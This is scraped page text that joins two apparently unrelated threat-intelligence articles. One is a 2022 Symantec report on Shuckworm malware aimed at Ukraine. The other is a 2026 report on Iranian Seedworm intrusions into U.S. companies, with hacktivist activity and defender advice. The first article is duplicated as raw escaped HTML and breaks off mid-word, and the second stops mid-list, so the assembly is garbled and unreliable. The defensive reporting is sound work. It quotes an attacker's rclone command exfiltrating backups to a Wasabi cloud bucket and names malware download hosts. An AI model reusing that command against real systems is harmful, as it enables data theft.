prose"><p><em><strong>UPDATE, 17.40 BST, August 15, 2022</strong>: Update for clarity re use of VCD, ASC, and H264 file extensions in file names.</em></p>

<p><em><strong>UPDATE, 17.50 BST, August 17, 2022:&nbsp;</strong>Additional IOCs added</em></p>

<p>Recent Shuckworm activity observed by Symantec, a division of <a href="https://software.broadcom.com/">Broadcom Software</a>, and aimed at Ukraine appears to be delivering information-stealing malware to targeted networks. This activity was ongoing as recently as August 8, 2022 and much of the activity observed in this campaign is consistent with activity that was highlighted by <a href="https://cert.gov.ua/article/971405">CERT-UA</a> on July 26.</p>

<p>The activity observed by Symantec began on July 15, and we have additional indicators of compromise (IOCs) and technical details to share about this campaign.</p>

<p>Shuckworm (aka Gamaredon, Armageddon) is a Russia-linked group that has almost exclusively focused its operations on Ukraine since it first appeared in 2014. It is generally considered to be a state-sponsored espionage operation.</p>

<h2>Infection Vector</h2>

<p>The first suspicious activity Symantec saw on victim systems was a self-extracting 7-Zip file, which was downloaded via the system’s default browser. Subsequently, mshta.exe downloaded an XML file, which was likely masquerading as an HTML application (HTA) file.</p>

<p>These files were downloaded from the following domain: a0698649[.]xsph[.]ru. It has been publicly documented since May 2022 that subdomains of xsph[.]ru are associated with Shuckworm activity, and this domain was once again mentioned in CERT-UA’s July 26 publication about Shuckworm activity.</p>

<p>This domain was also associated with an email that spoofed being from the Security Service of Ukraine and had “Intelligence Bulletin” in the subject line, according to CERT-UA. This being the case, it is most likely the 7-Zip file seen on victim networks in the campaign observed by Symantec was delivered to victims via email.</p>

<h2>Attack Chain</h2>

<p>The downloading of the XML file onto victim networks was followed by the execution of a PowerShell stealer. We saw three versions of the same PowerShell stealer appear on the one system. It’s possible the attackers may have deployed multiple versions of the stealer, which were all very similar, as an attempt to evade detection.</p>

<p>Two VBS downloaders that had the words “juice” and “justice” in their file names were also observed on victim machines. Analysis found that these were Backdoor.Pterodo, a well-known Shuckworm tool that Symantec <a href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-intense-campaign-ukraine">blogged about earlier this year</a>. These scripts are capable of calling PowerShell, uploading screenshots, and also executing code downloaded from a command-and-control (C&amp;C) server.&nbsp; &nbsp;</p>

<p>Various suspicious files containing “ntuser” in the file names were also seen on victim machines. We associate these “ntuser” files with Shuckworm activity, and many variants of them are malicious, with most detected as the Giddome backdoor, another well-known Shuckworm tool.</p>

<p>We saw various parent processes with file names that had VCD, H264 and ASC extensions. A file named <em>ntuser.dat.tmcontainer.vcd</em> was the parent process for a Giddome backdoor variant named<em> ntuser.dat.tm.descendant.exe</em> that was seen on victim machines. A suspicious file named <em>ntuser.dat.tmcontainer.h264 </em>had a child process named <em>ntuser.dat.tm.declare.exe</em>, another malicious Giddome backdoor binary. Elsewhere, a file named <em>ntuser.dat.tmcontainer.asc</em> had a child process named <em>ntuser.dat.tm.decay.exe</em>.</p>

<p>VCD files are disc images of a CD or DVD and are recognized by Windows as an actual disc, similar to ISO files, which we commonly see malicious actors use to deliver payloads. An ASC file is an encrypted file that may contain text or binary information encoded as text, while an H264 file is a video file. However, filenames with the <em>ntuser.dat.tmcontainer</em> prefix are files that represent the registry.</p>

<p>It’s not clear if these are the actual file types, or if the attackers are using these file names as a means of sowing confusion.</p>

<p>The backdoor dropped on victim systems had the file name <em>4896.exe</em>. This backdoor had multiple capabilities, including:</p>

<ul>
	<li>Record audio using the microphone and upload the recorded files to a remote location</li>
	<li>Take screenshots and upload them</li>
	<li>Log and upload keystrokes</li>
	<li>Download and execute .exe files or download and load DLL files</li>
</ul>

<p>The legitimate remote desktop protocol (RDP) tools Ammyy Admin and AnyDesk were both also leveraged by the attackers for remote access. Legitimate RDP tools like these and others are frequently leveraged for remote access by attackers in both ransomware and nation-state-backed cyber attacks.</p>

<h2>Shuckworm Keeps Focus on Ukraine&nbsp;</h2>

<p>This campaign, combined with previous public reporting on Shuckworm, shows some patterns in the operations of the group at the moment, including its reuse of patterns, e.g. paths (such as csidl_profile\music), using files that contain "ntuser.dat" in the file name, using various artifacts that contain, for&nbsp;example, "judgement" in the file name, and also leveraging EXE files whose file names contain English words that begin with "D", “dat”, “decay”, “deer”, “declare”, etc.</p>

<p>As the Russian invasion of Ukraine approaches the six-month mark, Shuckworm’s long-time focus on the country appears to be continuing unabated. That this recent activity continues even after CERT-UA documented it shows that fear of exposure does not deter the group from its activities. While Shuckworm is not necessarily the most tactically sophisticated espionage group, it compensates for this in its focus and persistence in relentlessly targeting Ukrainian organizations.</p>

<h2>Protection/Mitigation</h2>

<p>For the latest protection updates, please visit the <a href="https://www.broadcom.com/support/security-center/protection-bulletin">Symantec Protection Bulletin</a>.</p>

<h2>Indicators of Compromise</h2>

<p>If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file.</p>

17.40 BST, August 15, 2022\u003c/strong\u003e: Update for clarity re use of VCD, ASC, and H264 file extensions in file names.\u003c/em\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cem\u003e\u003cstrong\u003eUPDATE, 17.50 BST, August 17, 2022:\u0026nbsp;\u003c/strong\u003eAdditional IOCs added\u003c/em\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003eRecent Shuckworm activity observed by Symantec, a division of \u003ca href=\"https://software.broadcom.com/\"\u003eBroadcom Software\u003c/a\u003e, and aimed at Ukraine appears to be delivering information-stealing malware to targeted networks. This activity was ongoing as recently as August 8, 2022 and much of the activity observed in this campaign is consistent with activity that was highlighted by \u003ca href=\"https://cert.gov.ua/article/971405\"\u003eCERT-UA\u003c/a\u003e on July 26.\u003c/p\u003e\r\n\r\n\u003cp\u003eThe activity observed by Symantec began on July 15, and we have additional indicators of compromise (IOCs) and technical details to share about this campaign.\u003c/p\u003e\r\n\r\n\u003cp\u003eShuckworm (aka Gamaredon, Armageddon) is a Russia-linked group that has almost exclusively focused its operations on Ukraine since it first appeared in 2014. It is generally considered to be a state-sponsored espionage operation.\u003c/p\u003e\r\n\r\n\u003ch2\u003eInfection Vector\u003c/h2\u003e\r\n\r\n\u003cp\u003eThe first suspicious activity Symantec saw on victim systems was a self-extracting 7-Zip file, which was downloaded via the system’s default browser. Subsequently, mshta.exe downloaded an XML file, which was likely masquerading as an HTML application (HTA) file.\u003c/p\u003e\r\n\r\n\u003cp\u003eThese files were downloaded from the following domain: a0698649[.]xsph[.]ru. It has been publicly documented since May 2022 that subdomains of xsph[.]ru are associated with Shuckworm activity, and this domain was once again mentioned in CERT-UA’s July 26 publication about Shuckworm activity.\u003c/p\u003e\r\n\r\n\u003cp\u003eThis domain was also associated with an email that spoofed being from the Security Service of Ukraine and had “Intelligence Bulletin” in the subject line, according to CERT-UA. This being the case, it is most likely the 7-Zip file seen on victim networks in the campaign observed by Symantec was delivered to victims via email.\u003c/p\u003e\r\n\r\n\u003ch2\u003eAttack Chain\u003c/h2\u003e\r\n\r\n\u003cp\u003eThe downloading of the XML file onto victim networks was followed by the execution of a PowerShell stealer. We saw three versions of the same PowerShell stealer appear on the one system. It’s possible the attackers may have deployed multiple versions of the stealer, which were all very similar, as an attempt to evade detection.\u003c/p\u003e\r\n\r\n\u003cp\u003eTwo VBS downloaders that had the words “juice” and “justice” in their file names were also observed on victim machines. Analysis found that these were Backdoor.Pterodo, a well-known Shuckworm tool that Symantec \u003ca href=\"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-intense-campaign-ukraine\"\u003eblogged about earlier this year\u003c/a\u003e. These scripts are capable of calling PowerShell, uploading screenshots, and also executing code downloaded from a command-and-control (C\u0026amp;C) server.\u0026nbsp; \u0026nbsp;\u003c/p\u003e\r\n\r\n\u003cp\u003eVarious suspicious files containing “ntuser” in the file names were also seen on victim machines. We associate these “ntuser” files with Shuckworm activity, and many variants of them are malicious, with most detected as the Giddome backdoor, another well-known Shuckworm tool.\u003c/p\u003e\r\n\r\n\u003cp\u003eWe saw various parent processes with file names that had VCD, H264 and ASC extensions. A file named \u003cem\u003entuser.dat.tmcontainer.vcd\u003c/em\u003e was the parent process for a Giddome backdoor variant named\u003cem\u003e ntuser.dat.tm.descendant.exe\u003c/em\u003e that was seen on victim machines. A suspicious file named \u003cem\u003entuser.dat.tmcontainer.h264 \u003c/em\u003ehad a child process named \u003cem\u003entuser.dat.tm.declare.exe\u003c/em\u003e, another malicious Giddome backdoor binary. Elsewhere, a file named \u003cem\u003entuser.dat.tmcontainer.asc\u003c/em\u003e had a child process named \u003cem\u003entuser.dat.tm.decay.exe\u003c/em\u003e.\u003c/p\u003e\r\n\r\n\u003cp\u003eVCD files are disc images of a CD or DVD and are recognized by Windows as an actual disc, similar to ISO files, which we commonly see malicious actors use to deliver payloads. An ASC file is an encrypted file that may contain text or binary information encoded as text, while an H264 file is a video file. However, filenames with the \u003cem\u003entuser.dat.tmcontainer\u003c/em\u003e prefix are files that represent the registry.\u003c/p\u003e\r\n\r\n\u003cp\u003eIt’s not clear if these are the actual file types, or if the attackers are using these file names as a means of sowing confusion.\u003c/p\u003e\r\n\r\n\u003cp\u003eThe backdoor dropped on victim systems had the file name \u003cem\u003e4896.exe\u003c/em\u003e. This backdoor had multiple capabilities, including:\u003c/p\u003e\r\n\r\n\u003cul\u003e\r\n\t\u003cli\u003eRecord audio using the microphone and upload the recorded files to a remote location\u003c/li\u003e\r\n\t\u003cli\u003eTake screenshots and upload them\u003c/li\u003e\r\n\t\u003cli\u003eLog and upload keystrokes\u003c/li\u003e\r\n\t\u003cli\u003eDownload and execute .exe files or download and load DLL files\u003c/li\u003e\r\n\u003c/ul\u003e\r\n\r\n\u003cp\u003eThe legitimate remote desktop protocol (RDP) tools Ammyy Admin and AnyDesk were both also leveraged by the attackers for remote access. Legitimate RDP tools like these and others are frequently leveraged for remote access by attackers in both ransomware and nation-state-backed cyber attacks.\u003c/p\u003e\r\n\r\n\u003ch2\u003eShuckworm Keeps Focus on Ukraine\u0026nbsp;\u003c/h2\u003e\r\n\r\n\u003cp\u003eThis campaign, combined with previous public reporting on Shuckworm, shows some patterns in the operations of the group at the moment, including its reuse of patterns, e.g. paths (such as csidl_profile\\music), using files that contain \"ntuser.dat\" in the file name, using various artifacts that contain, for\u0026nbsp;example, \"judgement\" in the file name, and also leveraging EXE files whose file names contain English words that begin with \"D\", “dat”, “decay”, “deer”, “declare”, etc.\u003c/p\u003e\r\n\r\n\u003cp\u003eAs the Russian invasion of Ukraine approaches the six-month mark, Shuckworm’s long-time focus on the country appears to be continuing unabated. That this recent activity continues even after CERT-UA documented it shows that fear of exposure does not deter the group from its activities. While Shuckworm is not necessarily the most tactically sophisticated espionage group, it compensates for this in its focus and persistence in relentlessly targeting Ukrainian organizations.\u003c/p\u003e\r\n\r\n\u003ch2\u003eProtection/Mitigation\u003c/h2\u003e\r\n\r\n\u003cp\u003eFor the latest protection updates, please visit the \u003ca href=\"https://www.broadcom.com/support/security-center/protection-bulletin\"\u003eSymantec Protection Bulletin\u003c/a\u003e.\u003c/p\u003e\r\n\r\n\u003ch2\u003eIndicators of iEx"])</script><script>self.__next_f.push([1,"15:T7e3e,"])</script><script>self.__next_f.push([1,"\u003cul\u003e\u003cli data-list-item-id=\"e049099df4b3c749551937322f8e248b3\"\u003eActivity associated with Iranian APT group Seedworm has been spotted on the networks of multiple U.S. companies. The activity began in February 2026 and has continued in recent days.\u0026nbsp;\u003c/li\u003e\u003cli data-list-item-id=\"e18c3cb1b72c08ae6ef05fc2a0891a287\"\u003eA U.S. bank, airport, non-profit and the Israeli operations of a U.S. software company were among the targets.\u0026nbsp;\u003c/li\u003e\u003cli data-list-item-id=\"eedb0f948665852ab33beb535354c5638\"\u003eWe round up details of recent Iranian cyber threat activity and what defenders need to look out for.\u003c/li\u003e\u003c/ul\u003e\u003cp\u003e\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe Iranian APT group Seedworm (aka MuddyWater, Temp Zagros, Static Kitten) has been active on the networks of multiple U.S. companies since the beginning of February 2026, with activity continuing in recent days following U.S. and Israeli military strikes on Iran that have sparked conflict in the region.\u0026nbsp;\u003c/p\u003e\u003cp\u003eA U.S. bank, software company and airport, and non-governmental organizations in both the U.S. and Canada, have experienced suspicious activity on their networks in recent days and weeks. The software company is a supplier to the defense and aerospace industries among others, and has a presence in Israel, with the company’s Israel operation seeming to be the target in this activity.\u0026nbsp;\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003cp\u003eA previously unknown backdoor, which we have named Dindoor, was found on the networks of the Israeli outpost of this software company, with the same backdoor seen on the networks of a U.S. bank and the Canadian non-profit organization. This backdoor leverages Deno, the secure runtime for JavaScript and TypeScript, to execute. This backdoor was signed with a certificate issued to “Amy Cherne”.\u003c/p\u003e\u003cp\u003eThere was also an attempt to exfiltrate data from the software company using Rclone to a Wasabi cloud storage bucket. It’s not clear if this was successful.\u003c/p\u003e\u003cp\u003e\u003cem\u003erclone copy CSIDL_DRIVE_FIXED\\backups wasabi:[REMOVED]:/192.168.0.x\u003c/em\u003e\u003c/p\u003e\u003cp\u003eA different, Python backdoor called Fakeset was found on the networks of the U.S. airport and non-profit. It was signed by certificates issued to “Amy Cherne” and “Donald Gay”. The Donald Gay certificate has been used previously to sign malware linked to Seedworm. The backdoor was downloaded from two servers belonging to the Backblaze cloud storage company:\u003c/p\u003e\u003cp\u003e\u003cem\u003egitempire.s3.us-east-005.backblazeb2.com\u003c/em\u003e\u003c/p\u003e\u003cp\u003e\u003cem\u003eelvenforest.s3.us-east-005.backblazeb2.com\u003c/em\u003e\u003c/p\u003e\u003cp\u003eThe Donald Gay certificate was also used to sign a sample from the malware family we call Stagecomp and which downloads the Darkcomp\u0026nbsp;backdoor. The Stagecomp and the Darkcomp malware have been linked to Seedworm by vendors including Google, Microsoft and Kaspersky. While this malware wasn’t seen on the targeted networks, the use of the same certificates suggests the same actor - namely Seedworm - was behind the activity on the networks of the U.S. companies.\u003c/p\u003e\u003cp\u003eWhile it’s not known if the operations of Seedworm are disrupted by the current conflict, already having a presence on U.S. and Israeli networks prior to the current hostilities beginning means the threat group is in a potentially dangerous position to launch attacks. While we have disrupted these breaches, other organizations could still be vulnerable to attack.\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003cp\u003eSeedworm is a long-standing Iranian threat group, which usually mounts classic espionage attacks for the purposes of spying and information gathering. Active since 2017, CISA has said that Seedworm is “\u003ca href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-055a\"\u003ea subordinate element within the Iranian Ministry of Intelligence and Security\u003c/a\u003e (MOIS).” Seedworm originally focused on victims in the Middle East but later broadened its scope to target telecommunications, defense, local government, and oil and natural gas organizations in Asia, Africa, Europe, and North America. The group develops its own custom malware as well as using dual-use and living off the land tools.\u003c/p\u003e\u003ch2\u003eContext\u003c/h2\u003e\u003cp\u003eOn February 28, 2026, the U.S. and Israel launched a coordinated offensive military air operation targeting Iran, leading to the death of Iran’s Supreme Leader Ayatollah Ali Khamenei, who was apparently killed on March 1 when a U.S./Israeli airstrike hit his compound. Several other high-ranking Iranian officials, as well as multiple civilians, were also killed in strikes.\u003c/p\u003e\u003cp\u003eIn retaliation, Iran launched drones and ballistic missiles at adversaries throughout the Gulf region, including targeting Israel and U.S. military and diplomatic outposts in multiple countries in the region.\u003c/p\u003e\u003cp\u003eBecause of the heated tension in the region and ongoing attacks, it is likely Iran and its allies may also initiate cyber operations to further target their adversaries. Both Israel and Iran have a history of carrying out destructive cyberattacks, including against each other. While internet access in Iran may be disrupted by current military operations, there are cyber operatives working for the regime based in other countries.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe UK’s National Cyber Security Centre\u0026nbsp;\u003ca href=\"https://www.ncsc.gov.uk/news/ncsc-advises-uk-organisations-take-action-following-conflict-in-middle-east\"\u003ereleased an alert\u003c/a\u003e following this recent activity, stating that “Iranian state and Iran-linked cyber actors almost certainly currently maintain at least some capability to conduct cyber activity” and warning about the potential threat posed by “Iran-linked hacktivists”. Check Point also reported recently that the Handala threat group (see below)\u0026nbsp;\u003ca href=\"https://www.firstpost.com/tech/how-irans-handala-hackers-are-using-elon-musks-starlink-for-cyberattacks-amid-internet-blackout-ws-e-13985806.html\"\u003ehas been using the Starlink satellite network\u003c/a\u003e to stay online even before this most recent activity began, with the group reportedly leveraging the technology since mid-January, when a nationwide Internet shutdown was announced by Iran’s government.\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003cp\u003eExamining the cyber activity typically carried out by threat actors associated with Iran and its allies may help us predict the kinds of cyber operations we may see being executed as this conflict continues.\u0026nbsp;\u003c/p\u003e\u003cp\u003eIranian threat actors have become increasingly proficient in recent years. Not only has their tooling and malware improved, but they’ve also demonstrated strong social engineering capabilities, including spear-phishing campaigns and “honeytrap” operations used to build relationships with targets of interest to gain access to accounts or sensitive information.\u003c/p\u003e\u003cp\u003eOne of the hallmarks of Iran’s operations in cyberspace is that it periodically mounts destructive attacks against organizations in countries it deems hostile, which at the moment would obviously include the U.S. and Israel. That creates a risk for organizations in those countries because these attacks are about sending a message rather than stealing information, which means that any organization in the country targeted could be in the firing line.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eOther recent activity\u003c/h2\u003e\u003ch3\u003eDoxing Israeli officials and regional energy sector participants\u003c/h3\u003e\u003cp\u003eHandala is an Iranian-aligned hacktivist group that is also known to operate in support of Palestine. They have been active since at least 2024. They are known for conducting attacks targeting Israeli organizations and entities perceived to support Israel by conducting phishing attacks, data theft, ransomware, extortion and destructive attacks, including the use of custom wipers. The group operates a leaks site where victim names are posted alongside stolen data and messages from the group. The group was also reportedly active on multiple underground cybercrime forums including BreachForums, Ramp and Exploit during its early days, but has since become more active on Telegram channels and X (formerly Twitter).\u0026nbsp;\u003c/p\u003e\u003cp\u003eIn December 2025,\u0026nbsp;\u003ca href=\"https://www.kelacyber.com/blog/handala-hack-telegram-breach-israeli-officials\"\u003ethe group claimed to have compromised\u003c/a\u003e the mobile devices of former Israeli Prime Minister Naftali Bennett and Benjamin Netanyahu's Chief of Staff, Tzachi Braverman. The group leaked material they said they had stolen from the phones, including the contact information of prominent Israeli officials, journalists and business people, photos and videos. However,\u0026nbsp;\u003ca href=\"https://www.kelacyber.com/blog/handala-hack-telegram-breach-israeli-officials\"\u003eanalysis by researchers\u003c/a\u003e disputed some of these claims, saying that the attacks appeared to be limited to Telegram accounts, and did not achieve complete phone access.\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003cp\u003eIn February 2026, Handala\u0026nbsp;\u003ca href=\"https://www.timesofisrael.com/iran-linked-hacker-group-claims-to-breach-data-of-israels-largest-healthcare-network/\"\u003eclaimed to have breached one of Israel's largest healthcare networks\u003c/a\u003e. Meanwhile, in March 2026, the group said it had breached Sharjah National Oil Corporation and Israel Opportunity Energy, exfiltrating more than 1.3TB of sensitive data, including confidential financial data, oil contracts and project details. The group has also made claims about breaching Saudi Arabian energy company Saudi Aramco in a post on its leaks site. However, the documents shared appeared to consist of older files that were already in circulation previously. This raises the possibility that the claim may have been exaggerated or partially fabricated, potentially representing an influence or psychological operation intended to generate attention, panic or reputation damage. The group has also posted messages claiming that Israeli Prime Minister Benjamin Netanyahu will be their next target.\u0026nbsp;\u003c/p\u003e\u003ch3\u003eSpearphishing academics and NGOs for intelligence collection\u003c/h3\u003e\u003cp\u003e\u003ca href=\"https://www.group-ib.com/blog/muddywater-espionage\"\u003eIn an October 2025 campaign\u003c/a\u003e, Seedworm carried out a sophisticated spear-phishing attack that used a compromised mailbox to distribute a custom backdoor known as Phoenix to international organizations across the Middle East and North Africa (MENA), targeting more than 100 government entities as part of an espionage campaign.\u003c/p\u003e\u003cp\u003eThe attackers leveraged a malicious Office attachment that has technical overlap with previously reported Seedworm attacks to deliver Phoenix. The command \u0026amp; control (C\u0026amp;C) server also reportedly hosted the PDQ remote access tool, which was used for remote access and persistence, as well as a custom browser credential stealer. It is believed the motive behind these attacks was intelligence collection, as well as persistent access, for the purposes of longer-term espionage and exfiltration.\u003c/p\u003e\u003cp\u003eElsewhere, in November 2025,\u0026nbsp;\u003ca href=\"https://www.proofpoint.com/uk/blog/threat-insight/crossed-wires-case-study-iranian-espionage-and-attribution\"\u003eSeedworm was also linked to attacks that targeted academics with expertise on the Middle East and other foreign policy experts\u003c/a\u003e. This activity took place between June and August 2025. Suspicious spear-phishing emails impersonated Suzanne Maloney – the vice president and director of the Foreign Policy program at the Brookings Institution and an expert on Iran – using a Gmail address and a misspelled version of her name - “Suzzane Maloney.”. In the attacks, the actors started out using a benign email, which eventually led to a subsequent email that contained a malicious link to a remote access tool payload. It is likely these attacks were carried out as a means to perform espionage - more specifically, as a means to gather intelligence that could be leveraged for strategic advantage.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThese attacks had TTP overlaps with other Iranian aligned groups (Smoke Sandstorm, Mint Sandstorm/Charming Kitten) but were subsequently attributed to Seedworm.\u003c/p\u003e\u003ch2\u003eOther 2025 activity\u003c/h2\u003e\u003ch3\u003eCamera scanning for intelligence gathering\u003c/h3\u003e\u003cp\u003eMarshtreader (Pink Sandstorm, Agrius, Agonizing Serpens) is a group that has been active since 2020 and is reportedly linked to Iran’s Ministry of Intelligence and Security (MOIS). It is known for its destructive operations against countries in the Middle East, specifically Israel, conducting attacks under multiple aliases and leveraging data leaks in order to control and shape narratives using wiper and fake ransomware malware.\u0026nbsp;\u003c/p\u003e\u003cp\u003eIn June 2025,\u0026nbsp;\u003ca href=\"https://blog.checkpoint.com/research/what-defenders-need-to-know-about-irans-cyber-capabilities\"\u003eit was reported\u003c/a\u003e that the group was observed scanning for vulnerable cameras using CVE-2023-6895 and CVE-2017-7921 across Israel during the June 2025 conflict using infrastructure associated with Iranian actors.\u0026nbsp;\u003c/p\u003e\u003cp\u003eIn previous conflicts, actors have been observed compromising cameras to gather intelligence to support bombing damage assessment (BDA) by providing near-real time visibility of impact from bombings and strikes. It is likely these attacks were conducted to gain similar visibility into sensitive locations to perform reconnaissance and potentially enable follow-on targeting of high value targets.\u0026nbsp;\u003c/p\u003e\u003cp\u003eAdditionally, in June 2025,\u0026nbsp;\u003ca href=\"https://research.checkpoint.com/2026/2025-the-untold-stories-of-check-point-research/\"\u003ea successful password-spraying attack\u003c/a\u003e conducted from Nord VPN infrastructure against Israeli municipal government entities was reported followed by spear-phishing attacks that contained links to a ClickFix page designed to trick users into executing malicious PowerShell to ultimately deliver a remote access tool (RAT) that can execute arbitrary commands by the attackers. It is likely the motive behind these attacks was account compromise and espionage. It is not clear what actor was behind these attacks, but the targeting of Israeli targets points to an Iranian actor as the most likely perpetrator.\u0026nbsp;\u003c/p\u003e\u003ch3\u003eDieNet DDoS attacks\u0026nbsp;\u003c/h3\u003e\u003cp\u003eDieNet is a pro-Palestinian hacktivist group that emerged on Telegram around March 2025 and announced its intention to target “outlaw sites and corrupt government platforms” using DDoS attacks.\u0026nbsp;\u003c/p\u003e\u003cp\u003eFollowing the arrest of activist Mahmoud Khalil, its activities intensified, with the group\u0026nbsp;\u003ca href=\"https://www.cisecurity.org/insights/blog/hacktivist-group-dienet-claims-ddos-attacks-against-u-s-c-n-i\"\u003eclaiming responsibility\u003c/a\u003e for multiple DDoS attacks against U.S. critical infrastructure, including energy, financial, healthcare, government, transit and communication systems.\u0026nbsp;\u003c/p\u003e\u003cp\u003eIn its attacks, the group leveraged high-volume DDoS attacks reportedly via DDoS-as-a-service infrastructure, including TCP RST, DNS amplification, TCP SYN floods and NTP amplification attacks, as well as website defacements and data breaches.\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003cp\u003eBased on reporting, its motives were likely political retaliation and service disruption.\u003c/p\u003e\u003ch2\u003eWhat can we expect next?\u003c/h2\u003e\u003cp\u003eGiven Iran's history of attacks leveraging destructive wipers, distributed-denial-of-service (DDoS) and hack-and-leak attacks, the likely next steps for the nation’s cyber actors and supporters may be multiple campaigns combining high-visibility disruption for political signaling and lower-visibility access operations for strategic leverage.\u003c/p\u003e\u003cp\u003eDefenders should anticipate noisy activity such as DDoS attacks, defacements, and leak claims targeting government, transportation, energy and defense contractors to amplify psychological and economic pressure.\u0026nbsp;\u003c/p\u003e\u003cp\u003eIt is also likely that more capable state-aligned groups will continue credential harvesting operations, along with vulnerability exploitation and covert persistence against critical infrastructure to generate immediate impact, while also positioning themselves for potential future destructive, espionage or coercive operations.\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003ch3\u003eDDoS and defacements\u003c/h3\u003e\u003cp\u003eGiven the increase in \"hacktivist\" activity, we predict a surge in DDoS and defacements for fast signaling and media impact, similar to what has been observed recently with Handala’s claims of targeting critical national infrastructure (CNI).\u0026nbsp;\u003c/p\u003e\u003cp\u003eIt is likely such attacks would target a range of sectors, including government portals, municipal sites, airports/ports, logistics providers, banks, telcos, media and symbolic brands.\u0026nbsp;\u003c/p\u003e\u003ch3\u003ePassword spraying and mailbox compromises\u003c/h3\u003e\u003cp\u003eOver the last year, multiple reports involving Iran-backed groups repeatedly highlighted credential attacks and mailbox compromises as a means of initial access and intelligence gathering.\u0026nbsp;\u003c/p\u003e\u003cp\u003eTargets could include defense organizations, government, contractors and NGOs. Additionally, adjacent organizations that support base operations, including fuel, catering, logistics, and communications could also be targets of these attacks.\u003c/p\u003e\u003ch3\u003eLeaks / intimidation operations / psyops\u003c/h3\u003e\u003cp\u003eHacktivists such as Handala repeatedly use leaks and claims to amplify fear and pressure even when access is only partial - this is key escalation behavior.\u003c/p\u003e\u003cp\u003ePotential targets of these kinds of attacks and claims would likely include healthcare, local government, airports/ports, transportation and education, as well as high-profile individuals tied to defense, politics and media.\u0026nbsp;\u003c/p\u003e\u003ch3\u003eCritical infrastructure and opportunistic attacks\u003c/h3\u003e\u003cp\u003eGiven the current escalations between the U.S. and Iran, it is likely that CNI is at high risk of attack, as well as organizations supporting these entities.\u0026nbsp;\u003c/p\u003e\u003cp\u003eOrganizations with exposed terminal operating systems, schedules and trucking/rail interfaces may be targeted, as well as passenger processing systems, baggage systems, and contractor networks. Additionally, given the high risk, other organizations that operate within sectors such as energy/fuel supply chains may be targets.\u0026nbsp;\u003c/p\u003e\u003ch3\u003eDestructive attacks\u003c/h3\u003e\u003cp\u003eIran has previously exhibited high capabilities in destructive potential, particularly during escalation windows.\u0026nbsp;\u003c/p\u003e\u003cp\u003eAny attacks would likely to be focused on energy and utilities, transportation and logistics, financial sector, telecoms, healthcare, defense contractors and military suppliers.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eHow can defenders prepare?\u003c/h2\u003e\u003cp\u003eOrganizations should prepare by focusing on strengthening monitoring capabilities and ensure resilience across their infrastructure where possible. Early indicators such as vulnerability scanning, credential attacks and reconnaissance activity often provide an opportunity for defenders to detect intrusion attempts early in the attack chain.\u003c/p\u003e\u003ch3\u003eDDoS and defacement campaigns\u003c/h3\u003e\u003cp\u003eDue to the likelihood of early retaliation and intensifying psyops, defenders should expect attempts to disrupt public-facing services and monitor any internet-facing infrastructure for the following:\u003c/p\u003e\u003cul\u003e\u003cli data-list-item-id=\"e9907433f271915689c1a8bf019d5e62b\"\u003eSpikes in HTTP requests from large, distributed IP ranges\u003c/li\u003e\u003cli data-list-item-id=\"e96427b7a90e5da0e984af3f8c0fdd136\"\u003eRepeated probing of admin portals\u0026nbsp;\u003c/li\u003e\u003cli data-list-item-id=\"e5e00b81dc19d0213a0927459f8aa3503\"\u003eExploit attempts targeting web frameworks and content management systems\u003c/li\u003e\u003cli data-list-item-id=\"ee6934ad365e30a6db855c77a020ab770\"\u003eScanning activity against exposed API endpoints\u003c/li\u003e\u003c/ul\u003e\u003cp\u003eTo prepare, organizations should look at performing the following:\u003c/p\u003e\u003cul\u003e\u003cli data-list-item-id=\"ec76d32596b774764f73dba74c0de99fb\"\u003eDeploy web application firewalls (WAF) with updated rule sets\u003c/li\u003e\u003cli data-list-item-id=\"e1e15bf4aa2f26bf33c37f4461d24c983\"\u003eEnable DDoS protection via CDN or upstream filtering services\u003c/li\u003e\u003cli data-list-item-id=\"edee0f3fe7529f24ccea7061d72a38c0f\"\u003eDecommission any non-essential or unused publicly accessible services\u0026nbsp;\u003c/li\u003e\u003cli data-list-item-id=\"e61c448683b9b01d84672d644277a277d\"\u003eEnsure all up-to-date patches for web applications/plugins are applied regularly\u0026nbsp;\u003c/li\u003e\u003cli data-list-item-id=\"e292625cb84849c75a9c01dab5091fe9e\"\u003eEnsure website backups exist for rapid restoration, if required\u003c/li\u003e\u003cli data-list-item-id=\"e2962068e78c7b8fb76d38777f9d19c92\"\u003eMonitor underground forums, Telegram channels and social media for claims involving your organization\u003c/li\u003e\u003c/ul\u003e\u003ch3\u003eCredential attacks\u003c/h3\u003e\u003cp\u003eCredential attacks are one of the most common initial access techniques used by Iranian-linked groups, which include attack attempts against multiple public-facing services.\u003c/p\u003e\u003cp\u003eDefenders should ensure monitoring is in place to identify patterns consistent with password-spraying attempts, such as the following:\u003c/p\u003e\u003cul\u003e\u003cli data-list-item-id=\"e427180b681ed7588311582b71ca8c753\"\u003eRepeated login failure attempts across multiple users\u003c/li\u003e\u003cli data-list-item-id=\"ef4ff03b0e9f9454d42c7244b35dfa353\"\u003eAuthentication attempts from unusual geographic locations\u003c/li\u003e\u003cli data-list-item-id=\"e5b6a6023a07ca5a0ac1f477d3ac98ab9\"\u003eMFA fatigue attacks\u003c/li\u003e\u003cli data-list-item-id=\"e4f166e292d6f50afecd7b56e263882c6\"\u003eLogin attempts occurring outside of normal working hours\u0026nbsp;\u003c/li\u003e\u003cli data-list-item-id=\"eaab2500c0fbde3ff6fd9cc19b38f8224\"\u003eVulnerability scanning and exploitation of vulnerable VPN appliances or edge infrastructure\u003c/li\u003e\u003cli data-list-item-id=\"e31e40cd56aed39c23f15461e47c3e149\"\u003eDeployment of web shells on internet-facing servers\u003c/li\u003e\u003cli 